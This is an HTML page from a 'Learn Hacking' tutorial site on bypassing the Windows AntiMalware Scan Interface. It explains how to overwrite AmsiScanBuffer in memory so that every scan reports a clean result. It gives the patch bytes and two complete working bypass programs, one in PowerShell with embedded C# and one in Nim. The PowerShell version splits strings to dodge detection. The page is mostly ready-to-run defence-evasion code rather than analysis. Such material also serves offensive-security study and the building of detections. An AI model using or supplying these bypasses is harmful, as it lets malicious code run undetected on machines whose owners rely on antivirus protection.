<!DOCTYPE html>
<html lang="en" dir=>

<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="AMSI #  This is the Windows AntiMalware Scan Interface. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.
Patching AmsiScanBuffer #  It might be as easy as patching the AmsiScanBuffer function provided by amsi.dll to return false.
The basic process here is:
 Use LoadLibrary to read amsi.dll from disk into a known variable handle.">
<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="AMSI" />
<meta property="og:description" content="AMSI #  This is the Windows AntiMalware Scan Interface. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.
Patching AmsiScanBuffer #  It might be as easy as patching the AmsiScanBuffer function provided by amsi.dll to return false.
The basic process here is:
 Use LoadLibrary to read amsi.dll from disk into a known variable handle." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://brimstone.github.io/learn-hacking/docs/windows/evasion/amsi/" /><meta property="article:section" content="docs" />

<meta property="article:modified_time" content="2021-04-26T09:29:52-04:00" />

<title>AMSI | Learn Hacking</title>
<link rel="manifest" href="../../../../manifest.json">
<link rel="icon" href="../../../../favicon.png" type="image/x-icon">
<link rel="stylesheet" href="../../../../book.min.0a36c100c3ea78a0e704987f9303e963e7ee83b1dca16a523adf9e226bccddc2.css" integrity="sha256-CjbBAMPqeKDnBJh/kwPpY&#43;fug7HcoWpSOt&#43;eImvM3cI=">
<script defer src="../../../../en.search.min.adfe01926138d01c8665ba57e7018e050f884dc106b1f0503933dc6702d1aee3.js" integrity="sha256-rf4BkmE40ByGZbpX5wGOBQ&#43;ITcEGsfBQOTPcZwLRruM="></script>

<script defer src="../../../../sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk="></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

  
</head>

<body dir=>
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      
  <nav>
<h2 class="book-brand">
  <a href="../../../../"><span>Learn Hacking</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>











  



  
  
  
  

  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
    <a href="../../../../docs/lab/" class="">Lab</a>
  

          
  
  
  

  
  <ul>
    
  </ul>
  

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
    <a href="../../../../docs/recon/" class="">Recon</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="../../../../docs/recon/tools/" class="">Tools</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="../../../../docs/recon/tools/nmap/" class="">nmap</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
    <a href="../../../../docs/web/" class="">Web</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <span>Tools</span>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="../../../../docs/web/tools/burp/" class="">Burp</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <span>Vulnerabilies</span>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="../../../../docs/web/vulnerabilities/CSRF/" class="">CSRF</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="../../../../docs/web/vulnerabilities/IDOR/" class="">IDOR</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="../../../../docs/web/vulnerabilities/sqli/" class="">SQLi</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="../../../../docs/web/vulnerabilities/xss/" class="">XSS</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="../../../../docs/web/vulnerabilities/xxe/" class="">XXE</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
    <a href="../../../../docs/linux/" class="">Linux</a>
  

          
  
  
  

  
  <ul>
    
  </ul>
  

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
    <a href="../../../../docs/windows/" class="">Windows</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="../../../../docs/windows/evasion/" class="">Evasion</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="../../../../docs/windows/evasion/amsi/" class="active">AMSI</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
  </ul>
  











  
<ul>
  
  <li>
    <a href="https://github.com/brimstone/learn-hacking" target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="../../../../svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>AMSI</strong>

  <label for="toc-control">
    
    <img src="../../../../svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  <nav id="TableOfContents">
  <ul>
    <li><a href="#amsi">AMSI</a>
      <ul>
        <li><a href="#patching-amsiscanbuffer">Patching <code>AmsiScanBuffer</code></a>
          <ul>
            <li><a href="#powershell">Powershell</a></li>
            <li><a href="#nim">Nim</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="amsi">
  AMSI
  <a class="anchor" href="#amsi">#</a>
</h1>
<p>This is the 
  <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Windows AntiMalware Scan Interface</a>. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.</p>
<h2 id="patching-amsiscanbuffer">
  Patching <code>AmsiScanBuffer</code>
  <a class="anchor" href="#patching-amsiscanbuffer">#</a>
</h2>
<p>It might be as easy as patching the <code>AmsiScanBuffer</code> function provided by <code>amsi.dll</code> to return false.</p>
<p>The basic process here is:</p>
<ol>
<li>Use <code>LoadLibrary</code> to read <code>amsi.dll</code> from disk into a known variable handle.</li>
<li>Use <code>GetProcAddress</code> to identify the address of the <code>AmsiScanBuffer</code> function. Since <code>amsi.dll</code> should have already been loaded into the process at process start, this should be the address to the function already active in memory.</li>
<li>Use <code>VirtualProtect</code> to make the memory containing the <code>AmsiScanBuffer</code> function writable (0x40 == <code>PAGE_EXECUTE_READWRITE</code>).</li>
<li>Just copy over the byte code for a simple replacement function.</li>
</ol>
<p>Replacement function:</p>
<pre><code>b8 57 00 07 80          mov    eax,0x80070057 # AMSI_RESULT_CLEAN
c3                      ret
</code></pre><p>This replacement function is just two asm calls that push <code>AMSI_RESULT_CLEAN</code> into <code>eax</code> and return. This makes any call to <code>AmsiScanBuffer</code> succeed as if the file was clean.</p>
<h3 id="powershell">
  Powershell
  <a class="anchor" href="#powershell">#</a>
</h3>
<p>In powershell, patching <code>AmsiScanBuffer</code> basically means calling out to a little C# code to do the heavy work of calling Win32 APIs to patch the function in the current process.</p>
<details >
  <summary>Example</summary>
  <div class="markdown-inner">
    <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Credit: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsidll-amsiscanbuffer-by-rasta-mouse</span>

$Win32 = <span style="color:#e6db74">@&#34;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">using System;
</span><span style="color:#e6db74">using System.Runtime.InteropServices;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">public class Win32 {
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">    [DllImport(&#34;kernel32&#34;)]
</span><span style="color:#e6db74">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">    [DllImport(&#34;kernel32&#34;)]
</span><span style="color:#e6db74">    public static extern IntPtr LoadLibrary(string name);
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">    [DllImport(&#34;kernel32&#34;)]
</span><span style="color:#e6db74">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">&#34;@</span>

Add-Type $Win32

$LoadLibrary = <span style="color:#66d9ef">[Win32]</span>::LoadLibrary(<span style="color:#e6db74">&#34;am&#34;</span> + <span style="color:#e6db74">&#34;si.dll&#34;</span>)
$Address = <span style="color:#66d9ef">[Win32]</span>::GetProcAddress($LoadLibrary, <span style="color:#e6db74">&#34;Amsi&#34;</span> + <span style="color:#e6db74">&#34;Scan&#34;</span> + <span style="color:#e6db74">&#34;Buffer&#34;</span>)
$p = 0
<span style="color:#66d9ef">[Win32]</span>::VirtualProtect($Address, <span style="color:#66d9ef">[uint32]5, 0x40, [ref]</span>$p)
$Patch = <span style="color:#66d9ef">[Byte[]]</span> (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
<span style="color:#66d9ef">[System.Runtime.InteropServices.Marshal]</span>::Copy($Patch, 0, $Address, 6)

</code></pre></div><p><i>Source: <a href="../../../../examples/windows/evasion/amsi_powershell_rasta.ps1">amsi_powershell_rasta.ps1</a></i></p>

  </div>
</details>

<p>References:</p>
<ul>
<li><a href="https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/">https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/</a></li>
</ul>
<h3 id="nim">
  Nim
  <a class="anchor" href="#nim">#</a>
</h3>
<details >
  <summary>Example</summary>
  <div class="markdown-inner">
    <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nim" data-lang="nim"><span style="color:#75715e">#[
</span><span style="color:#75715e">    Author: Marcello Salvati, Twitter: @byt3bl33d3r
</span><span style="color:#75715e">    License: BSD 3-Clause
</span><span style="color:#75715e">    Credit: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
</span><span style="color:#75715e">]#</span>

<span style="color:#f92672">import</span> winim<span style="color:#f92672">/</span>lean
<span style="color:#f92672">import</span> strformat
<span style="color:#f92672">import</span> dynlib

<span style="color:#66d9ef">when</span> defined amd64:
    echo <span style="color:#e6db74">&#34;[*] Running in x64 process&#34;</span>
    <span style="color:#66d9ef">const</span> patch: <span style="color:#66d9ef">array</span><span style="color:#f92672">[</span><span style="color:#ae81ff">6</span>, byte<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>byte <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xC3</span><span style="color:#f92672">]</span>
<span style="color:#66d9ef">elif</span> defined i386:
    echo <span style="color:#e6db74">&#34;[*] Running in x86 process&#34;</span>
    <span style="color:#66d9ef">const</span> patch: <span style="color:#66d9ef">array</span><span style="color:#f92672">[</span><span style="color:#ae81ff">8</span>, byte<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>byte <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x00</span><span style="color:#f92672">]</span>

<span style="color:#66d9ef">proc </span><span style="color:#a6e22e">PatchAmsi</span>(): <span style="color:#66d9ef">bool</span> <span style="color:#f92672">=</span>
    <span style="color:#66d9ef">var</span>
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: <span style="color:#66d9ef">bool</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>

    <span style="color:#75715e"># loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows</span>
    <span style="color:#75715e"># it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything&#39;s ok (which you can&#39;t really do well when using LoadLibrary() directly through winim)</span>
    amsi <span style="color:#f92672">=</span> loadLib(<span style="color:#e6db74">&#34;amsi&#34;</span>)
    <span style="color:#66d9ef">if</span> isNil(amsi):
        echo <span style="color:#e6db74">&#34;[X] Failed to load amsi.dll&#34;</span>
        <span style="color:#66d9ef">return</span> disabled

    cs <span style="color:#f92672">=</span> amsi.symAddr(<span style="color:#e6db74">&#34;AmsiScanBuffer&#34;</span>) <span style="color:#75715e"># equivalent of GetProcAddress()</span>
    <span style="color:#66d9ef">if</span> isNil(cs):
        echo <span style="color:#e6db74">&#34;[X] Failed to get the address of &#39;AmsiScanBuffer&#39;&#34;</span>
        <span style="color:#66d9ef">return</span> disabled

    <span style="color:#66d9ef">if</span> VirtualProtect(cs, patch.len, <span style="color:#ae81ff">0x40</span>, <span style="color:#66d9ef">addr</span> op):
        echo <span style="color:#e6db74">&#34;[*] Applying patch&#34;</span>
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, <span style="color:#66d9ef">addr</span> t)
        disabled <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>

    <span style="color:#66d9ef">return</span> disabled

<span style="color:#66d9ef">when</span> isMainModule:
    <span style="color:#66d9ef">var</span> success <span style="color:#f92672">=</span> PatchAmsi()
    echo <span style="color:#e6db74">fmt&#34;[*] AMSI disabled: {bool(success)}&#34;</span>

</code></pre></div><p><i>Source: <a href="../../../../examples/windows/evasion/amsi_nim_offensivenim.nim">amsi_nim_offensivenim.nim</a></i></p>

  </div>
</details>

<h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="https://onlinedisassembler.com/odaweb/majaEeX0/0">https://onlinedisassembler.com/odaweb/majaEeX0/0</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants</a></li>
<li><a href="http://pinvoke.net/default.aspx/kernel32/VirtualProtect.html">http://pinvoke.net/default.aspx/kernel32/VirtualProtect.html</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">



  <div><a class="flex align-center" href="https://github.com/brimstone/learn-hacking/commit/20f4bf5b7a93f39680a7ddbeecb4237f2ef123a9" title='Last modified by Matt Robinson | April 26, 2021' target="_blank" rel="noopener">
      <img src="../../../../svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>April 26, 2021</span>
    </a>
  </div>



  <div>
    <a class="flex align-center" href="https://github.com/brimstone/learn-hacking/edit/trunk/content/docs/windows/evasion/amsi.md" target="_blank" rel="noopener">
      <img src="../../../../svg/edit.svg" class="book-icon" alt="Edit" />
      <span>Edit this page</span>
    </a>
  </div>

</div>

 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      
  <nav id="TableOfContents">
  <ul>
    <li><a href="#amsi">AMSI</a>
      <ul>
        <li><a href="#patching-amsiscanbuffer">Patching <code>AmsiScanBuffer</code></a>
          <ul>
            <li><a href="#powershell">Powershell</a></li>
            <li><a href="#nim">Nim</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>

 
    </aside>
    
  </main>

  
</body>

</html>












